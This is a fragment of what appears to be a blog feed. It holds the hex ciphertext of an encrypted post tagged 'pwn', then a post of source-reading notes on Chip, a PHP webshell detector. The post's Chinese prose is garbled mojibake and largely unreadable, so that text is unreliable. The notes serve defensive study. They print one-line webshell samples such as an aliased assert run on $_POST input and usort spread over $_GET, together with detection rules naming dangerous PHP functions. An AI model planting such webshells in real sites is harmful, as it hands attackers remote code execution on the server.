d7aaaed479c28ba4542357c7a6c8e31bb23aa6c7d23b5569c3af7c1370b85b04463f7811d81246b6dbaced47aacd123e659243eb6d5c213facb6e36b6de3cd18ef2236d30997d1b98da276f34d148e5e68ac8d6ec0d2d48e6f7fb87373a753e78c0652e0ccbfe1ca691b5b7500badab37822608f1b1d8de9fdf99d3c8b8613d06b5a8896ad3781b53dd2b2e4b1d8edd8f0fca7b7e113eb70afa5b89dd84ca4e6016ecfab2a992f96967f4e1d7159e476a8001ae857f62491f586db4c57c9cad4717c141c29644773a616368b97406de25be345a37f816f8d5f792ea9dfc0b13baed6e10546c94fc416fe8c30ad78c9e74f1c7bcd0354f362374e0c200e05f696d0cf352897729e5a4c5367e16afe693f47825773bb2cf04cf83599275bff24cbecc27734c398e4292a9731cf74a7a6efcb1b1532b96d96e130356a7296233013737b31e3d20b31dddbcce83b373b1978169eb587a32f3ce28ca0efad022134e01153e070b0ea5238ae7e95e6c8ec026644d11b9646e381adced09ad93982e0312f8033894a2bfd2786b4be703795ea3d99c19b473012a1262909d3c93b928ef1e392f693a934bea06ff7443a66502b2eab7ff95db6aa14af8c9cb60e54f419825a37c7bc6b11cd0479c6d643854654e945d90c51aede5501a6e33086245bc58aaf12c9925e21a806e2063e0417ccf8b6e09a2010a9f4a5a4171afd69296ed44579364ae62363007307c80ad8c8d045a40147d1983b7af584e9b0110609c8a3f573c76f9b32295a68155996c72b794e0af07412d9a41b12577286c85bbeb7ac09ad440fe5c8f24edb205298432ecdcfb43118e7e7c1fd327cb414d17322f242cd7aeb550ab043650b477208c5756c1ac737c9fc8c6b2015e5359a4f89b9440751d6c0ee477d54e6ee35617c7174aaef93c6b8f32b127fbc160e66fd56c8fd5a846f87c9a5c7ec167894ac6b7219bc2aa2a9077c83ebe001cfe0564ef0e9956be2a3067743322601b1374bafbf8d1ff5c39cf401b5eab4464c37d63bf8030fb70b6f02457e7d031e07d2f1f1b2d929e984635d3b9ccaa993afcef20d868a461fa35245b7a5c13bc7f2b8bfbf0276d94a15d39b9e6b54eda17a4d9550b5058a7ce85b3b2a2f50366ce50689afc46b140db337587b6dca3251bbfbaf56a3bd0d0d159fad67b204ef7e47bf488d157a9024b18a38faebc549acb62110c12c2a0c0a59ed523d468b3c78897033bf106e3a718a02909249c8fc8e43522c1322acb52bbb3f93f8319b63879eb22cd2a739f7935aabec518ae72b44a15d497e8c46857e9e697a9e17a644bb6fad6430b4efd2cc9e1a9d1e756309dc3dfd0c408706585e5c7f4caef2697ea2ed47244e679cc5c6a8ec150d5e69d5fb3a671a62ba4b93421c35c0016b32c44576e17efac5d97d614d9eb599c26b93c2be872f478aaca97f5cc7e8bd26732f25133d7642bc3590d0129f4dcc1c7edd9e1045e75726e780351bd0abc6e2c3b1f882dd66a5fdd77793feb1bf21b0851b2f28ce0e44fdc53908cc5fbc6174f79b49b7e7e538a5e932faa5a0b186722c4ed247e234aa7d203323237a3f2788f721c17f0229471d60ac25c0ef4ac1ff6b7e16ca3600e2cc97c0505ab33e683cb90586f220c1e10ee764afab1cf46c8612de5be0a88d23b4dd35065cbab68fc25683ae555ac936df4f8533fa7f4458d780ba0ec2743ab859596078524cad8bf6ae98b686f96e966cdbb510b6461d53ebaa9da98f7ca7bcef185525c1b23deae53545b4a2d8580ec83c8d00753820b086228fbe77146167239cb323a5613b9bb695259136ab307905bfb48da565e82b2992e7419849ea7490c0a3f9f38fc20e2d343948cb9697d893b2beaabb7402de35193e44ac179e7e0841eaebd71a272fc039ed406b606e55b200cc78d37f0427f322f32876e744edafcae3379460b782d00fb1394c3474139faf2302a893b296f7f4900f9a6645235f233e866aa852dfabfe0c99b597d84b1addae1eba13a6ea3cabef291a9c44d013cc27b41bfb08d2353df1789a5142c8d1010514b642d8462a9beaf8161f81cb183382985f46b7d2173afcd74f5b053fe72b17d96789b0b5e1d52a3c3d78b9646ee6e94f314f175034cfd7ceceec151248e5e2379d7d34515a6018336b32c2d8545a95cc81e77eb109789f8e7687e7ef4adc00a0b432dd1e89faca600f3b532275aeb080b38a68e8ee04eae7238ff323d6a05364a87eca377bd9862e7dfc96b763db9d90355f9cb3f466afba6f9d094b2490c2742813ce2d343482c001947a36e77c7dca0149ba56f3564fc831f73fd0d2df41380ab37f8b417e633f00e2d7eff9d45c6e7ad7e9b897ad4ec578d6e8723b4c5e7a2f510b2c047e74e7e696e18cbcc7047563576be95aa72d8a2805a7b81a5e812f09cdfa0facd5a97109eba92e86c915c2596d962d3d102a08918a9dfe7f32599d86226846c88065feae45d3f7f1ef8c1496dfa6114509fc44ad0acd414ac2cb445ecb31a2d98aa06c0777cadb0efc465a79344ba0eb299c5f965cb541248795c6e7d78feec7dbf096fac4cb0d3337cb2863da76954dd82199dd59a999a1d1f8d59e0b7849259b85a0c1eea74680e81e768f59d19c91cd0e05270fd32b8b1dd8965a97f5d06c095beb0f7f4f2bc68e7688a2f96eb791025c975e15ecffd8b2123e41cbb27ef57cdfc8d871b14c46d3d1f3216efadf5171e8f96d9327f5552f42ead231b023b703e0cbb34e6b9a30a5290c44e7b5cd4de07ab9351c2648c1ee838df792ccfd0888901be8b4fca879659341be6685041b0d34b8525e5654dce41df473f847b8db0167ac2120432bce2ac49171221c4362ae99d0f0db0a448f8067c1c75132173279e5098721ad8693dd8d07e512bddc462a60b30eb0c394c0d31b237cc709a8b1966745dd56f4e1aa1529900788c6978b8dcbbde7aa1eb05719ef6cadbeccf37788353a9cfdf39dedd28e350e8be1ed6b73d4da814452d140e740f79a582f6ece6e9bdcc8dca145591818d0e78d47f0541db6186dafb83c4a42fadc6ac9afa1c689b9b29367dff5740c692f1c14228109033478783cfac2aa7bfa717c5112ebf20a7b0417be291acb463c3e16c642a36f2cff4cc1bcf7aa54628bda6053436927780690f6ef23bba41af3bcbdf56cd58019f1f7384bf63c8b3bf8010ef1a8469c9e7d9c8c5c62d761f7b992a8dabd3ba1ee489b4a6cde74096cc0836e5501d5af36bc4bfe6140c34eb2c2b076f80c4b336836310b2b4f30c1fda1126ac4798a54d1740676042b5640ad9fa1df8b4912868c8caeb5e130ae17905c47f82266734a7026468840a470834c1c9838bdacbb7591620613873ef58c2d7ba44f5b3ffa6ac3e619f84d9b1b9ed050457358a930048b97a88bcd698386fbf9764f49b80f67397ece9df11160e4f3aa5923d3c02d8753b570a1b4f25d85e6a10a532e73eee846e45d501ae4e547ba806ba9f1093e7fba36c385d379b730f2a0e6351ac78308f6e598fb2bf53699e69af6b4d28075371012edde862fb0ba4a079c221cc3f6947002facf0dc9587c91dad6b42846babccd08c6e00dd5e8f16360a267d06057a9b5815b79fbec2f101176a5d09aa2a33c13965a9a32de07771ac1d39e905bc0fbab381bf532f2a85ed1159c728d2de30fd651237f39f901702435aa97afaa6da0d3a2159817c577f6ac29c349dcd5c45368688e5469a8848c1aa7b07de3b83139fab93b079ef0ad1e86fc7b490e72945a2ae8f7b4a8a5d01ecae8b0cc6c541db4a8f6c2c32ff2393c7763d8803327920f960036d5b2af327f86e51a77ee39b832c2a8e2f59d616e69d8dd76928323168fe00e08ac4bfd7ae7dd290cc11de5d3b32a4c4d9e6c585e7b74811025ac8a508e9862a9ce34943e71f3392d00717f9669e580800657b25ea1c8790655b59d2e1160243179ca67a6bec365ab26bbb693017d79ce2d403c7defd22a37de4b834ada017ea26da7c1c21a82066a5c0a47b0af873646d529946e3e3fc9017328389c11cc558b65e82fff1c616eef1a38dfee9a0d7100d4ffb32635c7fba3baf36d312f1eeb4dbc3e5b726ec20196d2d279f44d81f492af4b64966dd6d5d88f3d872618c72e5169d258df22b7cde345d5c6d895df7b38e9420b59cc1787c55bf4eae404631ba40b5bcc8825ab66abd6c2cb0dcdbc65009b8d6d5bc3eb1c8eb48b5b5606b36901eac274db325fb8694ab0f79e3a91c6442534067fe05cd504bbc4303f48bb3677fa410c31de77437907d310c67362806a514e57de1c7e0bec718f4b7a6fbd2634a1192aa2efc29c0967eb4aff668bde2e46f1a4baea53bd99868f67abb00a536adaa562f7e345327482cfd54138ece1775decf1b2b7afb963cf09ff5fa4307e3dcc0246fb04ed7b5e0acae060b6cc45764458702a1bb5ad82b6f18260031d579bab784cb5d4770e6d1739710f7cad15cae191555914a5a73b69ce8274e38c5677d3a7c6c72edab6b41b173fe5330fe54aa889e1ce7b1e528419029ebae1a80b3ca9266bc12e833bf6eab3d81cbd88059d25df295ccda8893df261974aa9ca666dbaf69e17b99c29bb2afbcf88e563212c3fee6f2ffc8d1cd9e33139255efc346d3a4ac4572b12a8a2aade8fa89b049f12d80005373f353c46276b20ecb6f650e9d71f9e33df689e39973dc8d116a65d075fe051da7e03e6ca74b727e562b233d54b3c4061039fa186c18c769cd12ecdb45c542b343c9cf0ff64ba9a5d49656650e60fbca55e8f1ade979d3eaf53389e8a6f25ce324b4e76c1ee8d4f77a4666299cdce87c95792f12377da2ba2ab87617c510a7cfe6318cc960ae3881acf0ef5f6bd7014ad44e645910c99ff8b41b32566808d67bcc3de2597389de0843edf308ab4da721ea20513312d6b6ee2da2db1ea86daf3c879957fb28695b02c42584fe639c61f2454b1855189b2134298b36ebae1f423f782a03b0792983dd410d2d13fef4c05844b399a40d9f30fb68ed916fcf19c9b87f397d3750f9adadf822ed84171b488f36b0730afdf14c215fc557734fc33ef91566afd9ed3f473fb2ff5309d49cbdae1f03d9ae42f9173280088643bc091afd1ae126edbeba142472de49d9902599321c46ccc50559da3950e907619dcac5b5aeb2c10cddb816ccbe7b7368b5c43e59cf900bf52baa2d974b083b510daee288460d195b3f06e54a3c4088c1578407a6528cd74f13df9a108235c757cfa89c8011ad1f9bd501f98a913f3a11bfb54b95620c2a6b1ff7fb6bccbcae16b37284b6f0c48f4107f3774d2f4be10487eedd80f7b211b170df39104162ac0ab15c661bc2bccfab8af21df83756114020f8dc88a49c8ea1ce44dc64a64f6ae1d9aea0536a34de2be8b3b683d077d21c03003bef28eb99698b69c3a0645cc9f0f8b542a9d366b0a3892caa23cc91f3a6f9f1db675fe422ea50667007a4c645f3c4dc4fa9bd1c74373659a9c82f5da97001aad2723dd452d9e8d837dbb549f167cd1cf3ad8167a369544ca9363c566752085945b09ac4ebbacbbf9cc2a30606ee34561575caa2abcc1a5010d575ec11dd7aceb1447b2c21b8aedd911b22c8a5b1008a9fd3e</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Chipä»£ç é˜…è¯»ç¬”è®°</title>
    <url>/2020/04/17/chip%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>è®°å½•è‡ªå·±é˜…è¯»Chipæºç </p>
<a id="more"></a>

<h1 id="0X00-æ€ç»´å¯¼å›¾"><a href="#0X00-æ€ç»´å¯¼å›¾" class="headerlink" title="0X00 æ€ç»´å¯¼å›¾"></a>0X00 æ€ç»´å¯¼å›¾</h1><p><img src="/2020/04/17/chip%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20200418212831298.png" alt="image-20200418212831298"></p>
<p><img src="/2020/04/17/chip%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20200418123816033.png" alt="image-20200418123816033"></p>
<h1 id="0x01-CHIP-æ•´ä½“æ£€æµ‹æ–¹æ³•"><a href="#0x01-CHIP-æ•´ä½“æ£€æµ‹æ–¹æ³•" class="headerlink" title="0x01 CHIP æ•´ä½“æ£€æµ‹æ–¹æ³•"></a>0x01 CHIP æ•´ä½“æ£€æµ‹æ–¹æ³•</h1><p>é€šè¿‡é˜…è¯»CHIPæºç ï¼Œå¯ä»¥çœ‹å‡ºå¼€å‘è€…åˆ†åˆ«å°†<strong>æ™®é€ševal/assertä»£ç ã€æ­£åˆ™/eæ¨¡å¼ä»£ç æ‰§è¡Œï¼ˆå¦‚ï¼špreg_matchå‡½æ•°ï¼‰ã€create_functionä»£ç æ‰§è¡Œã€ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œã€åŠ¨æ€å‡½æ•°è°ƒç”¨ï¼ˆå¦‚ï¼š$a($b)ï¼‰ã€å›è°ƒåé—¨ï¼ˆå¦‚call_user_funcå‡½æ•°ï¼‰ã€ç•¸å½¢/åŠ å¯†ä¸€å¥è¯æœ¨é©¬ï¼ˆå¦‚base64ç¼–ç ï¼‰ã€ä»»æ„æ–‡ä»¶åŒ…å«ï¼ˆå¦‚ï¼šincludeå‡½æ•°ï¼‰ã€PHPåå°„ï¼ˆå¦‚ï¼šReflectionClassç±»ï¼‰å’Œæ‰§è¡Œä¸å®‰å…¨çš„ç»§æ‰¿ä¸é‡å‘½ååˆ©ç”¨ï¼ˆå¦‚ï¼šå°†evalå‡½æ•°èµ·åˆ«åï¼‰</strong>è¿™äº›åŠ¨æ€ç‰¹æ€§çš„å½¢å¼æ€»ç»“å‡ºæ¥ï¼Œç„¶åå¾—åˆ°å„ç±»å‹çš„ç‰¹å¾ï¼Œåœ¨è¯­æ³•åˆ†æçš„å±‚é¢ä¸Šå¯¹phpåŠ¨æ€ç‰¹æ€§è¿›è¡Œæ•è·ï¼Œåˆ©ç”¨å·²æœ‰çš„PHP-ParseråŒ…æ¥å°†PHPè½¬æ¢æˆASTè¯­æ³•æ ‘ï¼Œç»“åˆæ¯ä¸ªç±»å‹çš„ç‰¹å¾è®¾ç½®ç›¸åº”çš„Visitorå»éå†ASTçš„æ¯ä¸ªèŠ‚ç‚¹ï¼Œé‡åˆ°æœ‰ç¬¦åˆç›¸åº”ç‰¹å¾çš„èŠ‚ç‚¹å°±è¾“å‡ºæŠ¥è­¦ä¿¡æ¯ï¼Œç›´åˆ°æ‰€æœ‰Visitoréå†å®ŒASTåç»“æŸã€‚</p>
<h1 id="0x02-å…¥å£æ–‡ä»¶"><a href="#0x02-å…¥å£æ–‡ä»¶" class="headerlink" title="0x02 å…¥å£æ–‡ä»¶"></a>0x02 å…¥å£æ–‡ä»¶</h1><p>/bin/chipï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (PHP_SAPI !== <span class="string">'cli'</span> &amp;&amp; PHP_SAPI !== <span class="string">'phpdbg'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Warning: Chip should be invoked via the CLI version of PHP, not the '</span>.PHP_SAPI.<span class="string">' SAPI'</span>.PHP_EOL;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/../vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Console</span>\<span class="title">Application</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $application = <span class="keyword">new</span> Application(<span class="string">'Chip'</span>, <span class="string">'1.3.0'</span>);</span><br><span class="line">    $application-&gt;addCommands([</span><br><span class="line">        <span class="keyword">new</span> \Chip\Console\Check()</span><br><span class="line">    ]);</span><br><span class="line">    $application-&gt;run();</span><br><span class="line">&#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œé‡‡ç”¨äº†pharç”¨æ¥æ‰“åŒ…é¡¹ç›®ï¼Œåœ¨æœ¬åœ°æµ‹è¯•å°†chipæ‰“åŒ…æ—¶éœ€è¦å°†binå’Œsrcæ‹·è´åˆ°é¡¹ç›®æ ¹è·¯å¾„ä¸­ï¼Œç„¶åè¿è¡Œå¦‚ä¸‹phpè„šæœ¬ã€‚å³å¯å°†chipæ‰“åŒ…æˆchip.pharã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dir = <span class="keyword">__DIR__</span>; <span class="comment">// éœ€è¦æ‰“åŒ…çš„ç›®å½•</span></span><br><span class="line">$file = <span class="string">'chip.phar'</span>; <span class="comment">// åŒ…çš„åç§°, æ³¨æ„å®ƒä¸ä»…ä»…æ˜¯ä¸€ä¸ªæ–‡ä»¶å, åœ¨stubä¸­ä¹Ÿä¼šä½œä¸ºå…¥å£å‰ç¼€</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="keyword">__DIR__</span> . <span class="string">'/'</span> . $file, FilesystemIterator::CURRENT_AS_FILEINFO | FilesystemIterator::KEY_AS_FILENAME, $file);</span><br><span class="line"><span class="comment">// å¼€å§‹æ‰“åŒ…</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;buildFromDirectory($dir);</span><br><span class="line">$phar-&gt;delete(<span class="string">'build1.php'</span>);</span><br><span class="line"><span class="comment">// è®¾ç½®å…¥å£</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php</span></span><br><span class="line"><span class="string">Phar::mapPhar('&#123;$file&#125;');</span></span><br><span class="line"><span class="string">require 'phar://&#123;$file&#125;/bin/chip';</span></span><br><span class="line"><span class="string">__HALT_COMPILER();</span></span><br><span class="line"><span class="string">?&gt;"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="comment">// æ‰“åŒ…å®Œæˆ</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Finished &#123;$file&#125;\n"</span>;</span><br></pre></td></tr></table></figure>

<h1 id="0x03-ä»£ç æµç¨‹"><a href="#0x03-ä»£ç æµç¨‹" class="headerlink" title="0x03 ä»£ç æµç¨‹"></a>0x03 ä»£ç æµç¨‹</h1><p>ç®€å†™çš„å‡½æ•°è°ƒç”¨æ ˆ</p>
<ol>
<li><p><code>new  Application()</code></p>
</li>
<li><p><code>application-&gt;addCommands([new \Chip\Console\Check])</code>      åŠ å…¥ -r  -l  ç­‰å‚æ•°</p>
</li>
<li><p><code>application-&gt;run()</code>    </p>
<ol>
<li><p><code>application-&gt;doRun()</code></p>
<ol>
<li><p><code>application-&gt;doRunCommand()</code></p>
<ol>
<li><p><code>command-&gt;run()</code></p>
<ol>
<li><p><code>command-&gt;execute()</code>      ===     <code>check-&gt;execute()</code></p>
<ol>
<li><p><code>check-&gt;checkCode()</code></p>
<ol>
<li><p><code>ChipFactory-&gt;create-&gt;detect()</code>   ===  <code>ChipManager-&gt;detect()</code>  æ·»åŠ visitor</p>
<ol>
<li><code>chip-&gt;feed()</code>      æ‰«æä»£ç    traverser<ol>
<li><code>chip-&gt;feed()-&gt;alarm()</code>   è·å–è¾“å‡ºç»“æœ</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<p>chipå…ˆè¯»å–è¾“å…¥çš„phpä»£ç ï¼Œç„¶ååˆ©ç”¨PHP-Parserå°†phpä»£ç è½¬æ¢æˆASTæŠ½è±¡è¯­æ³•æ ‘ï¼Œç„¶åé€šè¿‡æ·»åŠ Visitorsæ¥éå†ASTæ ‘ï¼Œåˆ†åˆ«å»æ£€æµ‹webshellã€‚</p>
<p>visitor åˆ†ä¸‰ç±»</p>
<ul>
<li><p>NameResolver     parserå†…ç½®çš„Visitorï¼Œåœ¨chipä¸­æ˜¯éå†ASTçš„ç¬¬ä¸€ä¸ªVisitorï¼Œåœ¨çœ‹åˆ°æœ‰ç”¨useç»™å‡½æ•°åˆ«åæ—¶ï¼Œå°†åˆ«åå’Œå‡½æ•°åŸåä¿å­˜ï¼Œä¹‹åå†éå†åˆ°æœ‰FuncCallèŠ‚ç‚¹æ—¶ï¼Œæ£€æŸ¥FuncCallçš„nameï¼Œè‹¥ä¸ºä¹‹å‰ä¿å­˜çš„åˆ«åï¼Œç„¶åä¿®æ”¹å½“å‰èŠ‚ç‚¹ã€‚<strong>è¿™é‡Œåªé’ˆå¯¹useåˆ«åwebshellè€Œè¨€ï¼ŒNameResolverè¿˜æœ‰å…¶ä»–åŠŸèƒ½ã€‚</strong></p>
<p>ç”¨äºæ£€æµ‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">function</span> <span class="title">assert</span> <span class="title">as</span> <span class="title">test</span>;</span><br><span class="line">test($_POST[<span class="number">2333</span>]);</span><br></pre></td></tr></table></figure>

<p>è¿™ç±»webshellã€‚</p>
</li>
<li><p>CallstackVisitor    å®šä¹‰ä¸€ä¸ªæ ˆï¼Œå…¥èŠ‚ç‚¹æ—¶å¦‚æœèŠ‚ç‚¹ä¸ºNode\Stmt\Function_ æˆ–Node\Stmt\ClassMethod å‹æ ˆï¼Œç¦»å¼€èŠ‚ç‚¹æ—¶ï¼Œè‹¥æ ˆéç©ºä¸”æ ˆé¡¶ä¸ºå½“å‰çš„èŠ‚ç‚¹ï¼Œå°†è¯¥èŠ‚ç‚¹å¼¹å‡ºæ ˆã€‚</p>
</li>
<li><p>Visitoræ–‡ä»¶å¤¹ä¸‹   å‡ç»§æ‰¿BaseVisitorï¼ŒbeforeProcess()åˆ†ä¸‰ç±»ï¼Œåœ¨å…¥èŠ‚ç‚¹å…ˆæ£€æµ‹å½“å‰èŠ‚ç‚¹æ˜¯å¦æ˜¯checkNodeClassï¼Œè‹¥æ˜¯åˆ™è°ƒç”¨process()å‡½æ•°ã€‚ä¸‹å›¾ä¸ºBaseVisitor.phpã€‚</p>
<p><img src="/2020/04/17/chip%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20200418214141523.png" alt="image-20200418214141523"></p>
<ul>
<li><p>Assert:   checkNodeClassä¸º<code>FuncCall</code>  ï¼Œè°ƒç”¨FunctionWalkerä¸­çš„beforeProcess() ,è°ƒç”¨getFunctionname(),è‹¥å‡½æ•°åä¸ºassert,è¿›è¡Œprocess() ,ç„¶åè°ƒç”¨hasDynamicExpr()æ£€æµ‹<code>$node-&gt;args[0]-&gt;value</code>,åˆ†åˆ«ç”¨hasVariable()å’ŒhasFunctionCall()æ£€æµ‹<code>$node-&gt;args[0]-&gt;value</code>èŠ‚ç‚¹ï¼Œæ˜¯å¦ä¸ºå¦‚ä¸‹ç±»å‹èŠ‚ç‚¹ï¼Œæ˜¯å°±criticalï¼Œå¦åˆ™warningã€‚<strong>åŒEval(EvalNode)  Shell  ShellFunction</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  hasVariable()</span><br><span class="line">  Node\Expr\Variable    		å˜é‡ </span><br><span class="line">  Node\Expr\PropertyFetch     </span><br><span class="line">  Node\Expr\ConstFetch 		</span><br><span class="line">  Node\Expr\ClassConstFetch  	</span><br><span class="line">  </span><br><span class="line">  hasFunctionCall()</span><br><span class="line">  Node\Expr\MethodCall  		</span><br><span class="line">  Node\Expr\FuncCall</span><br><span class="line">  Node\Expr\New_</span><br><span class="line">Node\Expr\StaticCall</span><br></pre></td></tr></table></figure>
</li>
<li><p>Callback: CheckNodeClassä¸ºFuncCallï¼Œåœ¨Chip/Schema/FunctionWithCallable.phpä¸­å®šä¹‰äº†FUNCTION_WITH_CALLABLEå¸¸é‡ï¼Œä¿å­˜å¸¦æœ‰å›è°ƒå‚æ•°çš„å‡½æ•°ï¼Œåœ¨Callbackçš„æ„é€ å‡½æ•°ä¸­å°†ä¸‹å›¾ä¸­çš„å‡½æ•°<img src="/2020/04/17/chip%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20200414171244310.png" alt="image-20200414171244310"></p>
<p>ä¿å­˜åˆ°$this-&gt;functionWithCallbackäºŒç»´æ•°ç»„ä¸­ï¼Œé”®ä¸ºå‡½æ•°åï¼Œå€¼ä¸ºå¯¹åº”çš„å›è°ƒå‚æ•°çš„ä½ç½®ã€‚è°ƒç”¨FunctionWalkerä¸­çš„beforeProcess() ï¼Œç„¶åè·å–å‡½æ•°åï¼Œåˆ¤æ–­åœ¨ä¸åœ¨$this-&gt;functionWithCallbackä¸­ï¼Œè‹¥åœ¨ï¼Œè°ƒç”¨process()å‡½æ•°,å…ˆéå†$node-&gt;argsï¼Œå¦‚æœæœ‰æœ‰ä½¿ç”¨<code>&lt;?php usort(...$_GET);?&gt;</code>è¿™ç§å‚æ•°ï¼ŒæŠ¥dangerã€‚ç„¶åæ£€æŸ¥å¯¹åº”posä½ç½®æ˜¯å¦æ˜¯å›è°ƒå‚æ•°ä½ç½®ï¼Œç„¶ååˆ¤æ–­$node-&gt;args[pos]-&gt;value instanceof Node\Expr\Closure ï¼Œæ˜¯å°±è·³è¿‡ï¼Œå¦åˆ™è°ƒç”¨hasDynamicExpr()å‡½æ•°æ£€æµ‹$node-&gt;args[pos]-&gt;value,è‹¥è¿”å›çœŸåˆ™æŠ¥dangerï¼Œè¿”å›å‡åˆ™è°ƒç”¨isSafeCallback($node-&gt;args[pos])ï¼Œå¦‚æœ$node-&gt;args[pos]-&gt;valueæ˜¯stringè€Œä¸”å‡½æ•°åæ»¡è¶³<code>/^\\\\?[a-z0-9_]+$/is</code>ä¸”å‡½æ•°åä¸åœ¨DANGER_FUNCTIONå¸¸é‡æ•°ç»„ä¸­ï¼ŒæŠ¥info,å¦åˆ™æŠ¥warning.</p>
</li>
<li><p>CreateFunction: CheckNodeClassä¸ºFuncCallï¼Œè°ƒç”¨FunctionWalkerä¸­çš„beforeProcess() ,è°ƒç”¨getFunctionname(),è‹¥å‡½æ•°åä¸ºcreate_function,è¿›è¡Œprocess() ,é¦–å…ˆè°ƒç”¨hasUnpackBefore()å‡½æ•°æ£€æµ‹$node-&gt;args[$i]-&gt;unpackæ˜¯å¦ä¸ºtrue,è‹¥ä¸ºtrueï¼ŒæŠ¥criticalï¼Œç„¶åè°ƒç”¨hasDynamicExpr()å‡½æ•°æ£€æµ‹$node-&gt;args[$i]-&gt;value,è‹¥è¿”å›çœŸï¼ŒæŠ¥critical,å¦åˆ™æŠ¥warningã€‚</p>
</li>
<li><p>DynamicCall: CheckNodeClassä¸ºFuncCall,è¿›è¡Œprocess() ,è‹¥hasDynamicExpr($node-&gt;name)ä¸ºçœŸï¼ŒæŠ¥dangerï¼Œå¦‚æœisName($node-&gt;name)ä¸ºå‡ï¼ŒæŠ¥waringã€‚ <strong>ä¸ªäººè®¤ä¸ºè¿™é‡Œè¯¯æŠ¥ç‡è¾ƒé«˜ï¼Œ</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  &lt;?php</span><br><span class="line">  $a &#x3D; 1;</span><br><span class="line">  eval($a());&#x2F;&#x2F;åªè¦æ˜¯ï¼ˆï¼‰å°±æŠ¥danger</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>DynamicMethod: CheckNodeClassä¸ºMethodCall,è¿›è¡Œprocess() ,è‹¥hasDynamicExpr($node-&gt;name)ä¸ºçœŸï¼ŒæŠ¥dangerï¼Œå¦‚æœisName($node-&gt;name)ä¸ºå‡ï¼ŒæŠ¥waringã€‚</p>
</li>
<li><p>DynamicNew: CheckNodeClassä¸ºNew_,è¿›è¡Œprocess()ä¸­æ£€æµ‹hasVariable($node-&gt;class),è¿”å›æ˜¯æŠ¥waringã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  &lt;?php</span><br><span class="line">  $a &#x3D; new $class;   &#x2F;&#x2F;æ²¡ç†è§£è¿™æ ·æœ‰ä»€ä¹ˆå±é™©</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>DynamicStaticMethod: CheckNodeClassä¸ºStaticCall,è¿›è¡Œprocess() ,</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">($node)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $class = $node-&gt;class;</span><br><span class="line">        $name = $node-&gt;name;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hasDynamicExpr($class)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;storage-&gt;danger($node, <span class="keyword">__CLASS__</span>, <span class="string">'ä»¥åŠ¨æ€ç±»å½¢å¼è°ƒç”¨é™æ€æ–¹æ³•ï¼Œå¯èƒ½å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œçš„éšæ‚£'</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hasDynamicExpr($name)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;storage-&gt;danger($node, <span class="keyword">__CLASS__</span>, <span class="string">'åŠ¨æ€è°ƒç”¨æ–¹æ³•ï¼Œå¯èƒ½å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œçš„éšæ‚£'</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;isName($class) || !<span class="keyword">$this</span>-&gt;isIdentifier($name)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;storage-&gt;warning($node, <span class="keyword">__CLASS__</span>, <span class="string">'ä¸è§„èŒƒçš„é™æ€æ–¹æ³•è°ƒç”¨ï¼Œå¯èƒ½å­˜åœ¨è¿œç¨‹ä»£ç 